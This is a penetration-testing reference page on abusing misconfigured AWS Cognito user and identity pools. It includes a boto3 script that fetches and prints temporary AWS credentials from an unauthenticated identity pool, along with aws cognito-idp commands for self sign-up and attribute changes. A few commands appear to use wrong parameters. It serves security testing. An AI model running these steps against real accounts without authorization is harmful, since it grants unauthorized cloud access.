---
title: AWS - Service - Cognito
type: technique
tags: [authentication, aws, cloud, cognito, exploitation, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# AWS - Service - Cognito

## What it is

AWS Cognito is an AWS-managed service for authentication, authorization, and user management.

## How it works

AWS Cognito manages user identity pools and federated identity pools; misconfigurations allow attackers to self-register accounts, escalate to higher-privileged Cognito user pool groups, or abuse identity pool federation to obtain temporary AWS credentials for backend services. Unauthenticated identity pools can be exploited directly without credentials, yielding AWS tokens scoped to the configured IAM role. Authenticated pools may expose excessive IAM permissions when the role assigned to authenticated users is not scoped to the minimum necessary.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

AWS Cognito is an AWS-managed service for authentication, authorization, and user management.

1. A user signs in through Cognito User Pools (authentication) or via a federated IdP (Google, Facebook, SAML, etc.).
2. Cognito Identity Pools can then exchange this identity for temporary AWS credentials (from STS — Security Token Service).
3. These credentials (Access Key ID, Secret Access Key, and Session Token) let the app directly call AWS services (e.g., S3, DynamoDB, API Gateway) with limited IAM roles/policies.

## Tools

* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) - A CLI tool for executing attacks on cognito such as *Unwanted account creation*, *Account Oracle* and *Identity Pool escalation*.

```ps1
# Installation
$ pip install cognito-scanner
# Usage
$ cognito-scanner --help
# Get information about how to use the unwanted account creation script
$ cognito-scanner account-creation --help
# For more details go to https://github.com/padok-team/cognito-scanner
```

## Identity Pool ID

* **User Pools** : User pools allow sign-in and sign-up functionality
* **Identity Pools** : Identity pools allow authenticated and unauthenticated users to access AWS resources using temporary credentials

Once you have the Cognito Identity Pool Id token, you can proceed further and fetch Temporary AWS Credentials for an unauthenticated role using the identified tokens.

```py
import boto3

region='us-east-1'
identity_pool='us-east-1:5280c436-2198-2b5a-b87c-9f54094x8at9'

client = boto3.client('cognito-identity',region_name=region)
_id = client.get_id(IdentityPoolId=identity_pool)
_id = _id['IdentityId']

credentials = client.get_credentials_for_identity(IdentityId=_id)
access_key = credentials['Credentials']['AccessKeyId']
secret_key = credentials['Credentials']['SecretKey']
session_token = credentials['Credentials']['SessionToken']
identity_id = credentials['IdentityId']
print("Access Key: " + access_key)
print("Secret Key: " + secret_key)
print("Session Token: " + session_token)
print("Identity Id: " + identity_id)
```

## AWS Cognito Commands

### Get User Information

```ps1
aws cognito-idp get-user --access-token $(cat access_token.txt)
```

### Admin Authentication

```ps1
aws cognito-idp admin-initiate-auth --access-token $(cat access_token)
```

### List User Groups

```ps1
aws cognito-idp admin-list-groups-for-user --username user.name@email.com --user-pool-id "Group-Name"
```

### Sign up

```ps1
aws cognito-idp sign-up --client-id <client-id> --username <username> --password <password>
```

### Modify Attributes

```ps1
aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
```

## References

* [Exploiting weak configurations in Amazon Cognito - Pankaj Mouriya - April 6, 2021](https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
